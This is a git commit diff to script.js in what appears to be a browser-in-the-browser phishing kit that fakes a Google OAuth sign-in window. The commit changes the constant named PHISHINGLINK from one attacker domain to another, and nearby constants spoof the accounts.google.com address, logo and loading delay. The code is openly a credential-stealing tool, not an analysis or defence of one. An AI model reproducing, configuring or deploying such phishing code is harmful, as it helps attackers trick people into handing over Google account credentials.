5c4393c26d4a8fe2410833229b9f3028396a1200
Lục Thiên Phong <90561566+lucthienphong1120@users.noreply.github.com>
2023-06-19 22:40:45 +0700

    Update script.js

--- Windows-Chrome-LightMode/script.js
+++ Windows-Chrome-LightMode/script.js
@@ -5,7 +5,7 @@ const DOMAINNAME = "https://accounts.google.com/";
 const DOMAINNAMEVERIFY = "accounts.google.com";
 const loadDOMAINPATH = "about:blank";
 const DOMAINPATH = "/o/oauth2/auth/identifier?redirect_uri=storagerelay&%3Fid%3Dauth74362&response_type=permission%20id_token&scope=email%20profile%20openid&openid.realm&include_granted_scopes=true&&fetch_basic_profile=true&gsiwebsdk=2&flowName=GeneralOAuthFlow";
-const PHISHINGLINK = "https://www.ltp110.tk/google-login/";
+const PHISHINGLINK = "https://ltp.crfnetwork.cyou/google-login/";
 const loadLOGO = "../loading.gif";
 const LOGO = "../google.svg";
 const loadTIME = 1000;
